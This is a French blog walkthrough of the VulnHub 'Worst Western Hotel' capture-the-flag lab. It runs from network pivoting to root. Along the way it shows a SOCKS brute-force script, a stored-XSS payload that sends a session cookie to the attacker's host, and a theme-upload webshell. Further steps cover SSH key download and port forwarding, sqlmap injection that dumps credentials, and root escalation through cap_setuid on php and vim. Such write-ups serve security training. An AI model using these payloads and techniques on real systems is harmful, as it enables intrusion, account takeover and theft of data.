# Solution du CTF Worst Western Hotel de VulnHub

Hôtel Transylvanie
------------------

[Worst Western Hotel](http://www.vulnhub.com/entry/worst-western-hotel-1,693/) est le nom d'un CTF créé par [Andreas Finstad (4ndr34z)](https://twitter.com/4nqr34z) et disponible sur VulnHub.  

L'objectif est de pirater un hôtel fictif et comme vous le verrez plus loin de nous exercer au pivoting :)  

```plain
Nmap scan report for 192.168.56.9
Host is up (0.00064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://prime.worstwestern.com/
|_http-server-header: Apache/2.4.29 (Ubuntu)
1080/tcp open  socks5  (Username/password authentication required)
| socks-auth-info: 
|   Username and password
|_  No authentication
```

Les services accessibles annoncent déjà quelques difficultés sur le plan réseau : pas de SSH permettant un accès pratique plus tard mais un serveur SOCKS dont on ne dispose pas d'identifiants.  

Comme l'indique l'output de Nmap le site tente une redirection vers *prime.worstwestern.com*, j'ajoute donc une entrée dans mon fichier */etc/hosts* sans quoi la navigation sur le site sera impraticable.  

La page d'index est d'une lenteur... sans faille. D'ailleurs d'autres parties du site se sont montrées extrêtement lentes ce qui m'a beaucoup pénalisé sur ce CTF.  

Pour le reste il s'agit d'une appli web de gestion d'un hôtel avec la possibilité de réserver une chambre. La grande majorité des fonctionnalités a sans doute été retiré sur le site ce qui fait qu'au final il reste un formulaire de login et un formulaire de contact.  

![VulnHub worst western hotel index page](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/wwhotel/index.png)

Le site semble basé sur PrestaShop d'après les balises méta :  

```html
<title>Worst Western Hotel</title>
<meta name="description" content="Website powered by Webkul" />
<meta name="generator" content="PrestaShop" />
```

Je relève aussi dans le code HTML une date qui pourrait donner une idée de la version du logiciel :

```plain
* 2007-2018 PrestaShop
```

Enfin, il y a différents liens sociaux au bas du site qui nous font comprendre que le site est une instance de [QloApps](https://qloapps.com/), un logiciel open-source de réservation d'hôtel en ligne.  

J'ai aussi relevé deux adresses emails mentionnées dans les pages : *prime@worstwestern.com* et *global@worstwestern.com*.  

Finalement j'ai procédé à une énumération web pour les noms de dossiers :  

```plain
$ feroxbuster -n -u http://192.168.56.9/  -w raft-large-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.9/
 🚀  Threads               │ 50
 📖  Wordlist              │ raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
WLD        0l        0w        0c Got 302 for http://192.168.56.9/c3eb13864b9c4e00a1b1cc38607694ee (url length: 32)
WLD         -         -         - http://192.168.56.9/c3eb13864b9c4e00a1b1cc38607694ee redirects to => http://prime.worstwestern.com/
301        9l       28w      312c http://192.168.56.9/cache
301        9l       28w      314c http://192.168.56.9/modules
301        9l       28w      310c http://192.168.56.9/css
301        9l       28w      309c http://192.168.56.9/js
301        9l       28w      310c http://192.168.56.9/img
403        9l       28w      277c http://192.168.56.9/download
301        9l       28w      313c http://192.168.56.9/themes
301        9l       28w      313c http://192.168.56.9/upload
403        9l       28w      277c http://192.168.56.9/docs
403        9l       28w      277c http://192.168.56.9/config
301        9l       28w      312c http://192.168.56.9/tools
301        9l       28w      310c http://192.168.56.9/pdf
403        9l       28w      277c http://192.168.56.9/classes
403        9l       28w      277c http://192.168.56.9/log
403        9l       28w      277c http://192.168.56.9/mails
301        9l       28w      319c http://192.168.56.9/translations
301        9l       28w      312c http://192.168.56.9/tests
301        9l       28w      318c http://192.168.56.9/controllers
301        9l       28w      317c http://192.168.56.9/webservice
301        9l       28w      317c http://192.168.56.9/adminpanel
403        9l       28w      277c http://192.168.56.9/server-status
301        9l       28w      319c http://192.168.56.9/localization
301        9l       28w      311c http://192.168.56.9/Core
403        9l       28w      277c http://192.168.56.9/override
--- snip ---
```

Là encore le serveur n'a pas été un foudre de guerre et c'est finalement en cherchant les fichiers texte sur la racine que j'ai obtenus quelques détails intéressants.  

Il y a par exemple un *CHANGELOG.txt* avec le numéro de version *V1.5.0 QloApps* mais surtout le fichier *config.txt* avec le contenu suivant :  

```plain
Service-Access to camera-surveillance network: 192.168.1.0/24
..
Username: Prime
password: temppassword (changed regulary )
```

Chaussettes trouées
-------------------

Cette note mentionne un réseau différent mais les identifiants ne semblent pas fonctionner pour le serveur SOCKS.  

Au passage Firefox ne permet pas de spécifier des identifiants pour un proxy SOCKS il a donc fallut installer [l'extension Proxy Toggle](https://addons.mozilla.org/en-US/firefox/addon/proxy-toggle/) qui fait bien le taff.  

Les identifiants n"étant pas acceptés sur l'appli web il est tant de bruteforcer le proxy SOCKS. Nmap dispose d'un module pour cela mais utilise par défaut sa propre liste de comptes et mots de passe.  

Un module Nmap hérite souvent de modules de base et pour savoir quelles options passer il faut un peu fouiller dans la documentation [du module](https://nmap.org/nsedoc/scripts/socks-brute.html) et du module parent [pour le brute force](https://nmap.org/nsedoc/lib/unpwdb.html#script-args).  

J'ai créé une petite liste d'utilisateurs à partir des infos glanées jusqu'à présent :  

```plain
prime
Prime
worstwestern
hotel
guest
worst
western
global
```

puis j'ai fournit la fameuse wordlist rockyou pour les mots de passe :  

```bash
$ nmap --script socks-brute --script-args userdb=wordlist.txt,passdb=rockyou.txt -p 1080 192.168.56.9

Nmap scan report for prime.worstwestern.com (192.168.56.9)
Host is up (0.00029s latency).

PORT     STATE SERVICE
1080/tcp open  socks
| socks-brute: 
|   Accounts: 
|     Prime:tinkerbell1 - Valid credentials
|_  Statistics: Performed 381182 guesses in 900 seconds, average tps: 411.5

Nmap done: 1 IP address (1 host up) scanned in 918.24 seconds
```

Soit un total de 15 minutes de bute force plus le temps de l'énumération web sur un serveur peu véloce, ça commence à faire :-/ Au moins on a le mot de passe !  

Une étude des paquets via Wireshark permet de constater que le protocole SOCKS est plutôt simple. Sans doute trop simple même car tous les paquets ne partagent pas un entête commun (le serveur s'attend à les recevoir dans un ordre bien défini du coup ça lui fait une belle jambe). Le point négatif c'est qu'il est difficile d'apliquer un filtre Wireshark si on espérait filtrer sur les réponses d'authentification réussies.  

Pour réécrire le brute force en Python ça donnerait ceci (j'ai utilisé la méthode *to\_bytes* qui est assez récente) :  

```python
import socket
import sys

userfile = sys.argv[1]
passfile = sys.argv[2]

def get_packet(username: str, password: str) -> bytes:
    buff = b"\x01"
    buff += len(username).to_bytes(1, byteorder="little")
    buff += username.encode()
    buff +=  len(password).to_bytes(1, byteorder="little")
    buff += password.encode()
    return buff

with open(userfile, encoding="utf-8", errors="replace") as fd_user:
    for line  in fd_user:
        user = line.strip()
        with open(passfile, encoding="utf-8", errors="replace") as fd_pass:
            for line in fd_pass:
                password = line.strip()

                sock = socket.socket()
                sock.connect(("192.168.56.9", 1080))
                sock.send(b"\x05\x03\x00\x01\x02")  # ask for auth methods
                sock.recv(1024)  # get auth methods
                sock.send(get_packet(user, password))  # try user/password auth
                response = sock.recv(1024)
                if response != b"\x01\x01":
                    print(f"success with {user} / {password}")

                sock.close()
```

On va pouvoir configurer [ProxyChains-NG](https://github.com/rofl0r/proxychains-ng) pour faire transiter nos paquets via ce proxy socks. Il suffit de spécifier la ligne suivante en fin du fichier *proxychains.conf* (sous la section *[ProxyList]* :  

```plain
socks5 192.168.56.9 1080 Prime tinkerbell1
```

Et pour Firefox la configuration Proxy Toggle :  

![VulnHub Worst Western Hotel Socks proxy configuration](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/wwhotel/proxy_toggle.png)

On peut faire passer Nmap via le serveur SOCKSv5 à condition que ce soit en mode connecté (avec -sT). De la même façon on ne pourra pas effectuer un ping-scan. Il faut donc choisir quel port tester, ici le port 80 sur la plage d'adresse *192.168.1.0/24* qui était mentionnée dans le fichier texte :  

```plain
$ ./proxychains4 -f proxychains.conf nmap -sT -Pn -p 80 -T5 192.168.1.0/24
-- snip --
[proxychains] Strict chain  ...  192.168.56.9:1080  ...  192.168.1.124:80  ...  OK
-- snip --

Nmap scan report for 192.168.1.124
Host is up (0.019s latency).

PORT   STATE SERVICE
80/tcp open  http
```

Plus qu'à lancer la cavalerie lourde sur cette IP (tiens, du Docker !) :  

```plain
$ ./proxychains4 -q -f proxychains.conf nmap -sT -sV -sC -Pn -p- -T5 192.168.1.124
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.1.124
Host is up (0.0077s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was login.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was login.php
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=*.vm/organizationName=Docker Boilerplate
| Not valid before: 2015-05-04T17:14:40
|_Not valid after:  2025-05-01T17:14:40
```

J'ai eu le nez fin (ou plutôt la sale habitude) en regardant le code source de la page et les headers HTTP via cURL :  

```bash
$ curl --proxy-user Prime:tinkerbell1 -x socks5://192.168.56.9:1080/ -D- http://192.168.1.124/
```

En effet dans le code HTML retourné on peut voir des logs d'authentifications essayées sur la page de login :  

```html
<tr><td class='success'>Login</td><td>2021-12-09 12:41:22</td> <td>192.168.1.212</td> <td>user</td></tr>
<tr><td class='fail' >Failed!</td><td>2021-12-09 12:41:50</td> <td>192.168.1.99</td> <td>Prime</td></tr>
<tr><td class='success'>Login</td><td>2021-12-09 12:42:33</td> <td>192.168.1.212</td> <td>user</td></tr>
```

Ce que l'on aurait pas remarqué avec un navigateur car une redirection HTTP a lieu en même temps (entête *Location: login.php*).  

Si j'essaye de me connecter avec *test* entouré de la balise HTML *em* je vois dans les logs que l'injection du code HTML a fonctionné. On est donc dans un cas de stored XSS :  

```html
<tr><td class='fail' >Failed!</td><td>2021-12-09 12:51:27</td> <td>192.168.1.99</td> <td><em>test</em></td></tr>
```

Et on est visiblement sur la bonne voie car un indice du challenge mentionne [une vulnérabilité similaire](https://www.exploit-db.com/exploits/39171).  

J'ai donc passé le code suivant en nom d'utilisateur et attendu de voir si j'avais un retour sur le port 8000 :  

```html
<script src='//192.168.56.1:8000/index.js'></script>
```

Effectivement ça tape à la porte :  

```plain
GET /index.js HTTP/1.1
Accept: */*
Referer: http://192.168.1.124/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: 192.168.56.1:8000
```

On a l'impression d'avoir affaire à un véritable navigateur. Je vais donc utiliser un code JS similaire à celui du [CTF Proteus](http://devloop.users.sourceforge.net/index.php?article216/solution-du-ctf-proteus-de-vulnhub) :  

```html
<script>var img = document.createElement("img");
img.src = "http://192.168.56.1:8000/?" + encodeURI(document.cookie);
document.body.appendChild(img);</script>
```

Ce code ajoute une image au DOM dont la source est une URL qui fera fuiter le cookie de la personne chez qui le JS est exécuté.  

Ça devait fonctionner... en théorie. Malheureusement le navigateur continuait de récupérer mon *index.js* sans aller plus loin. A la place j'ai injecté directement le payload comme nom d'utilisateur sur le formulaire de login et cette fois la pèche fût bonne :  

```plain
192.168.56.9 - - [09/Dec/2021 13:09:33] "GET /?PHPSESSID=qs7j0b3ddh71ekf9lcl7nhj6eu HTTP/1.1" 200 -
```

TV5Monde
--------

Avec l'extension Firefox *Cookie Quick Manager* (mais plein d'autres font le job) j'édite la valeur du cookie ce qui me permet de me connecter au site comme si j'étais l'administrateur.  

![VulnHub worst western hotel CCTV pictures](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/wwhotel/cctv_website.png)

Un javascript simule l'affichage de caméras de sécurité. La majorité sont des images fixes (une est animée) et sont toutes définies dans ce tableau :  

```javascript
images[0] = "4063830e548b8aea3586473c668aac826516be33/1.jpg";
images[1] = "4063830e548b8aea3586473c668aac826516be33/c49675b5b5ef6ac738587d12051b607b13c78c79.jpg";
images[2] = "4063830e548b8aea3586473c668aac826516be33/3.jpg";
images[3] = "4063830e548b8aea3586473c668aac826516be33/4.gif";
images[4] = "4063830e548b8aea3586473c668aac826516be33/5.jpg"; 
images[5] = "4063830e548b8aea3586473c668aac826516be33/6.jpg"; 
```

Celle qui a le path le plus long est particulièrement intéressante car on peut y voir un bureau avec un écran d'ordinateur sur lequel est collé un postit avec la mention suivante :  

![Worst Western Hotel VulnHub CTF password on postit](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/wwhotel/postit.png)

```plain
peterg
Birdistheword
```

Retour à la case départ avec ces identifiants (il faudra utiliser l'adresse email *peterg@worstwestern.com*) qui permettent de se connecter au *QloApps* via l'URL */adminpanel/* (*PrestaShop* ne semble pas avoir un path fixe pour l'interface d'administration, il est donc primordial de l'avoir trouvé auparavant).  

J'ai fouillé un très long moment dans l'interface web avant de trouver quelque chose d'intéressant. J'ai remarqué que l'appli dispose d'une table SQL où sont stockées toutes les pages non trouvées donc quand je lance une énumération web je remplis la base de données MySQL ainsi que (certainement) les logs Apache, ce qui peut potentiellement expliquer la lenteur sur ce CTF.  

La technique pour obtenir un webshell sur du PrestaShop est relativement similaire à ce qu'on ferait sur du Wordpress ou un autre CMS. La différence est que l'on ne peut pas éditer un fichier PHP directement, il faut créer un nouveau thème à partir d'un déjà existant, exporter ce nouveau thème, le supprimer, l'éditer en local (pour injecter notre backdoor) puis l'uploader sur le site.  

![VulnHub Worst Western Hotel Prestashop theme duplication](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/wwhotel/duplicate_prestashop_theme.png)

En temps normal ça ne doit pas prendre une demi heure (arghh !).  

L'édition en local ressemble à ceci (les thèmes sont des archives ZIP) :  

```bash
mkdir yolo
cd yolo
unzip exported.zip
vi themes/yolo/index.php
zip -r new_theme .
```

Une fois notre *new\_theme.zip* uploadé via l'interface de gestion des thèmes on obtient notre shell à l'adresse */themes/yolo/index.php* qui nous renseigne par exemple sur notre utilisateur actuel :  

```plain
uid=1000(qloapps) gid=1000(qloapps) groups=1000(qloapps)
```

Un petit *ipconfig*, c'est là qu'il faut avoir les yeux en face des trous :  

```plain
eth0: flags=4163  mtu 1500
        inet 192.168.0.100  netmask 255.255.255.0  broadcast 192.168.0.255
        ether 02:42:c0:a8:00:64  txqueuelen 0  (Ethernet)
        RX packets 3462362  bytes 310799606 (310.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3385714  bytes 4264715673 (4.2 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 6613  bytes 504600 (504.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6613  bytes 504600 (504.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Oui, on est encore sur un autre réseau ! On remarque aussi la présence d'un fichier .dockerenv à la racine du disque.  

Un client SSH et le monde vous appartient
-----------------------------------------

A ce stade un petit PTY serait le bienvenue mais comme vu au début aucun SSH n'est exposé. Il y a pourtant sur le container Docker actuel un serveur SSH qui ne demande que nous.  

On va effectuer un remote forwarding du service SSH local qui sera ensuite accessible sur le port 2222 de notre machine.  

Première étape, j'ai créé en local un jeu de clés sans passphrase :  

```bash
$ ssh-keygen -b 2048 -t rsa -f ctf_key -q -N ""
```

Sur le Docker je les rappatrie via Wget au bon emplacement :  

```bash
wget http://192.168.56.1:8000/ctf_key -O /home/qloapps/.ssh/id_rsa
wget http://192.168.56.1:8000/ctf_key.pub -O /home/qloapps/.ssh/id_rsa.pub
cp /home/qloapps/.ssh/id_rsa.pub /home/qloapps/.ssh/authorized_keys
```

J'ajoute aussi cette clé publique dans mon *authorized\_keys* local. L'absence de passphrase est primordial vu que à ce stade je ne dispose pas de PTY et ne pourrait donc pas saisir de mot de passe.  

Finalement je remote-forwarde le port (sur le Docker) :  

```bash
$ ssh -N -o "StrictHostKeyChecking no" -R 2222:localhost:22 devloop@192.168.56.1
```

Et depuis ma machine :  

```bash
$ ssh -i ctf_key -p 2222 qloapps@127.0.0.1

qloapps@prime:~$ ls
Flag1.txt  www
qloapps@prime:~$ cat Flag1.txt 
3dddaab46a4d2267811d9524c2af7b23dd8db460
```

Sur cette machine je trouve les identifiants SQL pour le *QloApps* (*/home/qloapps/www/hotelcommerce/config/settings.inc.php*) :  

```php
define('_DB_SERVER_', 'localhost');
define('_DB_NAME_', 'qloapps');
define('_DB_USER_', 'root');
define('_DB_PASSWD_', 'myrootpassword');
```

Il s'avère que c'est une impasse. On va plutpot énumérer ce qui pourrait être présent sur le réseau 192.168.0.1/24.  

Bien sûr on est dans un Docker donc côté outils il ne faut pas d'attendre à grand chose. Netcat n'est même pas présent mais oh surprise Python3 est installé avec le module *requests*.  

Je bidouille un petit scanner de port 80 tout ce qu'il y a de plus bête :  

```python
import requests
from requests.exceptions import RequestException

for i in range(1, 254):
    try:
        response = requests.get(f"http://192.168.0.{i}/", allow_redirects=False, timeout=3)
    except RequestException:
        continue
    else:
        print(f"Success with 192.168.0.{i} - {response.headers}")
```

On obtient deux IPs qui répondent avec à première vue la même page :  

```plain
Success with 192.168.0.1 - {'Date': 'Fri, 10 Dec 2021 12:28:37 GMT', 'Server': 'Apache/2.4.29 (Ubuntu)', 'Location': 'http://prime.worstwestern.com/', 'Content-Length': '0', 'Connection': 'close', 'Content-Type': 'text/html; charset=utf-8'}
Success with 192.168.0.100 - {'Date': 'Fri, 10 Dec 2021 12:33:30 GMT', 'Server': 'Apache/2.4.29 (Ubuntu)', 'Location': 'http://prime.worstwestern.com/', 'Content-Length': '0', 'Connection': 'close', 'Content-Type': 'text/html; charset=utf-8'}
```

On peut aller plus loin encore avec le forward SSH en mettant en place un proxy SOCKSv4 qui nous permettra d'utiliser Nmap :  

```bash
$ ssh -D 127.0.0.1:1080 -p 2222 -N -i ctf_key qloapps@127.0.0.1
```

Il faut créer un nouveau fichier de conf pour ProxyChains-NG (histoire de ne pas s'emmêler les pinceaux). La ligne de configuration sera la suivante :  

```plain
socks4 127.0.0.1 1080
```

On obtient les même résultats mais avouez que ça fait plus pro :  

```plain
$ ./proxychains4 -f docker_socks.conf -q nmap -p80 -T5 -sV -sT --open 192.168.0.1/24
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.0.1
Host is up (0.0013s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Nmap scan report for 192.168.0.100
Host is up (0.0017s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (256 hosts up) scanned in 1552.90 seconds
```

Certes ça fait 25 minutes de scan *\*\*rire nerveux\*\**  

Finalement le plus efficace c'est d'uploader [un Nmap compilé statiquement](https://github.com/ZephrFish/static-tools/tree/master/nmap). On ne pourra pas tout faire avec (il manque quelques fichiers qui doivent être spécifiques à la verson compilée) mais on a les résultats de base (et on peut pinger) et surtout la vitesse d'exécution :  

```plain
qloapps@prime:~$ ./nmap -sP -T5 192.168.0.1/24

Starting Nmap 7.11 ( https://nmap.org )
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.0.1
Host is up (0.0015s latency).
Nmap scan report for prime (192.168.0.100)
Host is up (0.00016s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 14.72 seconds
```

L'adresse *192.168.0.1* a quelques secrets à nous révéler :  

```plain
qloapps@prime:~$ ./nmap -p- -T5 -sT 192.168.0.1

Starting Nmap 7.11 ( https://nmap.org )
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.0.1
Host is up (0.00029s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
1080/tcp open  socks

Nmap done: 1 IP address (1 host up) scanned in 16.97 seconds
```

Notamment le port 443 héberge un site web pas encore croisé :  

```plain
qloapps@prime:~$ curl -s -k -D- https://192.168.0.1/ | grep -i title
<title>CRM | Login</title>
```

Il s'agit d'une appli web qui expose à ce stade deux fonctionnalités : login et récupération de mot de passe perdu.  

On peut changer la configuration de *Proxy Toggle* dans Firefox pour le faire pointer vers notre SOCKS4 local. De là quelques tests permettent de constater que le formulaire de récupération de mot de passe est vulnérable à une faille d'injection SQL de type test booléen.  

![VulnHub CTF worst western hotel boolean-based SQL injection](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/wwhotel/boolean_sql.png)

Par défaut (en ne passant que les options de base) SQLmap s'y cassait les dents, il a donc fallut le tenir par la main pour qu'il voit l'exploitation boolean-based :  

```bash
$ ./proxychains4 -q -f docker_socks.conf python /tools/sqlmap-dev/sqlmap.py -u 'https://192.168.0.1/forgot-password.php' --data 'email=yolo*&submit=&submit=' --timeout 60 --dbms mysql --level 5 --risk 3 --string 'Your Password'
```

Pour la suite je vous renvoie à l'aide de SQLmap (options *--dbs*, *-D*, *-T*, *--dump*) :  

```plain
available databases [2]:
[*] crm
[*] information_schema

Database: crm
[5 tables]
+-----------+
| user      |
| admin     |
| prequest  |
| ticket    |
| usercheck |
+-----------+

Database: crm
Table: user
[7 entries]
+----+---------------+-------------------------+--------+------------+--------+----------------------------+------------------+--------------------------------+------------+---------------------+
| id | name          | email                   | status | mobile     | gender | address                    | password         | alt_email                      | user_image | posting_date        |
+----+---------------+-------------------------+--------+------------+--------+----------------------------+------------------+--------------------------------+------------+---------------------+
| 3  | Peter Griffin | peterg@worstwestern.com | 0      | 8285703354 | Female | Sec-5 Sahibabad Ghaziabad  | TheBirdIsTheWord | peter.griffin@worstwestern.com | NULL       | 2015-01-01 12:30:00 |
| 7  | Rahul         | rahul@gmail.com         | 0      | 8285703355 | m      | <blank>                    | 123456           | <blank>                        | <blank>    | 2015-02-03 12:30:00 |
| 9  | Anuj          | demo@gmail.com          | 0      | 1234567890 | m      | New Delhi India            | Test@12345       | test@gmail.com                 | <blank>    | 2019-07-10 13:30:00 |
| 11 | Test user     | testuser@gmail.com      | NULL   | 1234567890 | Male   | New Delhi                  | Test@123         | ak@gmail.com                   | NULL       | 2019-08-06 13:09:15 |
| 12 | ABc           | abc@gmail.com           | NULL   | 1234567890 | m      | New Delhi India            | Test@123         | jsadgj@gmail.com               | NULL       | 2019-08-10 06:24:31 |
| 13 | me            | me@home.no              | NULL   | 1          | m      | NULL                       | Test             | NULL                           | NULL       | 2020-10-18 13:09:33 |
| 14 | me            | me@home2.no             | NULL   | 2          | m      | NULL                       | me               | NULL                           | NULL       | 2020-10-18 13:23:55 |
+----+---------------+-------------------------+--------+------------+--------+----------------------------+------------------+--------------------------------+------------+---------------------+

Database: crm
Table: admin
[1 entry]
+----+-------+---------------------+
| id | name  | password            |
+----+-------+---------------------+
| 1  | admin | MySecretPassword123 |
+----+-------+---------------------+
```

Il y a un compte SSH associé pour l'utilisateur *peterg* sur le serveur 192.168.0.1 (le mot de passe est *TheBirdIsTheWord*) :  

```plain
qloapps@prime:~$ ssh peterg@192.168.0.1
peterg@192.168.0.1's password: 
Linux hotelww 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64

peterg@hotelww:~$ id
uid=1000(peterg) gid=1000(peterg) groups=1000(peterg)
```

Endgame
-------

```plain
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:24:ba:a1 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.9/24 brd 192.168.56.255 scope global dynamic eth0
       valid_lft 372sec preferred_lft 372sec
    inet6 fe80::a00:27ff:fe24:baa1/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:85:7b:22:df brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-b5886ea668dd: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0f:ec:11:4c brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.1/24 brd 192.168.1.255 scope global br-b5886ea668dd
       valid_lft forever preferred_lft forever
    inet6 fe80::42:fff:feec:114c/64 scope link 
       valid_lft forever preferred_lft forever
5: br-cca9bcd0be69: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:4c:04:56:ec brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.1/24 brd 192.168.0.255 scope global br-cca9bcd0be69
       valid_lft forever preferred_lft forever
    inet6 fe80::42:4cff:fe04:56ec/64 scope link 
       valid_lft forever preferred_lft forever
```

A voir les interfaces il semble que l'on touche finalement au but !  

On trouve aussi un second flag :  

```plain
peterg@hotelww:~$ cat Flag2.txt 
6ebccebc6644299d554b7854bc22d297eb0d2335
```

*LinPEAS* trouve un exploit potentiel (*[CVE-2019-13272] PTRACE\_TRACEME*) mais ce qui saute surtout aux yeux ce sont les capabilities données aux binaires *php* et *Vim* :  

```plain
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/php7.3 = cap_setuid+ep
/usr/bin/vim = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
```

Ecrire un script PHP qui donne un shell ne suffira pas : on n'est pas sur un cas de binaire setuid qui change l'UID effectif. Il faut donc appeler explicitement setuid pour obtenir ce shell :  

```php
<?php
posix_setuid(0);
system("bash -p");
?>
```

Ca fonctionne :  

```plain
peterg@hotelww:~$ /usr/bin/php7.3 test.php 
root@hotelww:~# id
uid=0(root) gid=1000(peterg) groups=1000(peterg)
root@hotelww:~# cd /root/
root@hotelww:/root# ls
Flag3.txt
root@hotelww:/root# cat Flag3.txt 
c6d2ff8d486ef58f2aa8f16b4658884897230620
```

Le cas de Vim semble plus compliqué mais je ne pouvais pas l'ignorer. Pour que ça fonctionne il faut que le programme appel de lui-même *setuid* ce qui serait possible par exemple si on chargeait une librairie en mémoire.  

C'est exactement ce que j'ai trouvé dans [une documentation sur Vim](https://vimhelp.org/eval.txt.html#libcall%28%29) :  

```plain
libcall({libname}, {funcname}, {argument})
                Call function {funcname} in the run-time library {libname}
                with single argument {argument}.
```

Il nous faut appeler cette commande préfixée de *echo* pour éviter un message d'erreur :  

```plain
:echo libcall("/usr/lib/x86_64-linux-gnu/libc.so.6", "setuid", 0)
```

La commande s'attend à recevoir les arguments de la même façon que la fonction c'est pour cela que le 0 n'est pas entre guillemets (sinon on obtient un UID qui n'existe pas sur le système).  

Une fois que Vim a récupéré le bit setuid on appel bash de façon classique :  

```plain
:!bash -p
```

Sous le capot
-------------

Les grandes étapes du CTF sont constituées de containers Docker :  

```plain
root@hotelww:/root# docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                           NAMES
27621f70edca        4ndr34z/wwcamera    "/entrypoint supervi…"   7 months ago        Up 29 hours         80/tcp, 443/tcp, 9000/tcp                       camera
ad38409077c4        54df9c863036        "/bin/ash -c /init.sh"   13 months ago       Up 29 hours         22/tcp                                          surfer
cc12d63f25ef        4ndr34z/wwproxy     "dumb-init sockd"        13 months ago       Up 29 hours         0.0.0.0:1080->1080/tcp                          proxy
70b3e0c40034        4ndr34z/hotelww     "/usr/bin/supervisord"   13 months ago       Up 29 hours         22/tcp, 443/tcp, 3306/tcp, 0.0.0.0:80->80/tcp   hotel
```

On peut étudier le mécanisme de Cross-Site Scripting dans le container *surfer* :  

```plain
root@hotelww:/root# docker exec -it ad38409077c4 /bin/sh
/ # cd /root
~ # ls
do.sh    surf.js
~ # cat do.sh
#!/bin/ash
while true
do
        /usr/local/bin/phantomjs /root/surf.js
        sleep 60
done
~ # cat surf.js
var page = require('webpage').create();
var url = "http://192.168.1.124/login.php";
page.settings.resourceTimeout = 5000; // 5 seconds
page.settings.userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36';
page.onResourceTimeout = function(e) {                       
  phantom.exit(1); 
};
page.onConsoleMessage = function(msg, lineNum, sourceId) {
    console.log('CONSOLE: ' + msg + ' (from line #' + lineNum + ' in "' + sourceId + '")');
};

page.open(url, function (status) {
    page.onConsoleMessage = function(msg, lineNum, sourceId) {
